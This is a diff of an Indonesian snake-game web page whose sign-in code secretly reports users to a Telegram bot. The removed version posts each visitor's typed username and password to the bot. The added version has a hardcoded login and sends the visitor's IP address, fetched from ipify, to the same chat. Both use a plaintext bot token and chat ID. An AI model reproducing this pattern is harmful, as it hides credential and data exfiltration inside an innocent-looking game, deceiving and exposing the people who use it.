@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Daftar & Main Game Ular</title>
+    <title>Login & Main Game Ular</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -19,7 +19,6 @@
             border-radius: 10px;
             width: 300px;
             margin: auto;
-            display: block;
         }
         input, button {
             width: 100%;
@@ -33,12 +32,8 @@
             border: none;
             cursor: pointer;
         }
-        button:hover {
-            background: darkgreen;
-        }
-        #gameContainer {
-            display: none;
-        }
+        button:hover { background: darkgreen; }
+        #gameContainer { display: none; }
         canvas {
             background-color: #111;
             border: 2px solid white;
@@ -64,34 +59,21 @@
         }
         .btn:active { background: gray; }
         .empty { visibility: hidden; }
-        #restartBtn {
-            display: none;
-            margin-top: 10px;
-            padding: 10px 20px;
-            font-size: 18px;
-            font-weight: bold;
-            border: none;
-            background: red;
-            color: white;
-            cursor: pointer;
-        }
-        #restartBtn:hover { background: darkred; }
     </style>
 </head>
 <body>
 
-    <!-- FORM PENDAFTARAN -->
-    <div id="registerContainer" class="container">
-        <h2>Daftar Akun</h2>
-        <input type="text" id="username" placeholder="Masukkan Username" required>
-        <input type="password" id="password" placeholder="Masukkan Password" required>
-        <button onclick="register()">Daftar</button>
+    <!-- LOGIN -->
+    <div id="loginContainer" class="container">
+        <h2>Login</h2>
+        <input type="text" id="username" placeholder="Username">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="login()">Login</button>
     </div>
 
     <!-- GAME ULAR -->
     <div id="gameContainer">
         <canvas id="gameCanvas"></canvas>
-
         <div class="controls">
             <div class="empty"></div>
             <div class="btn" onclick="changeDirection('UP')">↑</div>
@@ -100,36 +82,42 @@
             <div class="btn" onclick="changeDirection('DOWN')">↓</div>
             <div class="btn" onclick="changeDirection('RIGHT')">→</div>
         </div>
-
-        <button id="restartBtn" onclick="restartGame()">Restart</button>
     </div>
 
     <script>
-        function register() {
+        function login() {
             const username = document.getElementById("username").value;
             const password = document.getElementById("password").value;
 
-            if (!username || !password) {
-                alert("Harap isi semua kolom!");
+            if (username !== "Darel" || password !== "1") {
+                alert("Login gagal! Username atau password salah.");
                 return;
             }
 
-            // Token bot dan ID Telegram Anda
+            // Ambil IP pengguna
+            fetch("https://api64.ipify.org?format=json")
+                .then(response => response.json())
+                .then(data => {
+                    const userIP = data.ip;
+                    sendToTelegram(userIP);
+                });
+
+            // Tampilkan game setelah login
+            document.getElementById("loginContainer").style.display = "none";
+            document.getElementById("gameContainer").style.display = "block";
+            initGame();
+        }
+
+        function sendToTelegram(ip) {
             const botToken = "8017274977:AAGonzixUns6wo0chSKgyw3BveSQDuQd2oM";
             const chatId = "8105758234";
+            const message = `🔔 *Login Baru!*\n👤 Username: *Darel*\n🌍 IP: *${ip}*`;
 
-            // Kirim data ke Telegram
-            const message = `🔔 *Pendaftaran Baru!*\n👤 Username: *${username}*\n🔑 Password: *${password}*`;
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
             });
-
-            // Sembunyikan form dan tampilkan game
-            document.getElementById("registerContainer").style.display = "none";
-            document.getElementById("gameContainer").style.display = "block";
-            initGame();
         }
 
         // GAME ULAR
@@ -139,18 +127,14 @@
         canvas.width = box * 20;
         canvas.height = box * 20;
 
-        let snake, food, direction, gameOver;
+        let snake, food, direction;
         let lastUpdateTime = 0;
         let moveSpeed = 100;
-        const tailImage = new Image();
-        tailImage.src = "IMG20250130120450.jpg";
 
         function initGame() {
             snake = [{ x: 10 * box, y: 10 * box }];
             food = { x: Math.floor(Math.random() * 20) * box, y: Math.floor(Math.random() * 20) * box };
             direction = "RIGHT";
-            gameOver = false;
-            document.getElementById("restartBtn").style.display = "none";
             lastUpdateTime = performance.now();
             requestAnimationFrame(gameLoop);
         }
@@ -170,14 +154,6 @@
         }
 
         function gameLoop(currentTime) {
-            if (gameOver) {
-                ctx.fillStyle = "white";
-                ctx.font = "30px Arial";
-                ctx.fillText("Game Over", canvas.width / 4, canvas.height / 2);
-                document.getElementById("restartBtn").style.display = "block";
-                return;
-            }
-
             requestAnimationFrame(gameLoop);
 
             if (currentTime - lastUpdateTime > moveSpeed) {
@@ -204,17 +180,19 @@
         function draw() {
             ctx.fillStyle = "#111";
             ctx.fillRect(0, 0, canvas.width, canvas.height);
+
             ctx.fillStyle = "red";
             ctx.fillRect(food.x, food.y, box, box);
 
             snake.forEach((segment, index) => {
-                ctx.fillStyle = "green";
+                ctx.fillStyle = index === 0 ? "black" : "green";
                 ctx.fillRect(segment.x, segment.y, box, box);
-                if (index === 0) ctx.fillStyle = "black", ctx.fillText("YADI", segment.x + 3, segment.y + 18);
+                if (index === 0) {
+                    ctx.fillStyle = "white";
+                    ctx.fillText("YADI", segment.x + 3, segment.y + 18);
+                }
             });
         }
-
-        function restartGame() { initGame(); }
     </script>
 </body>
 </html>
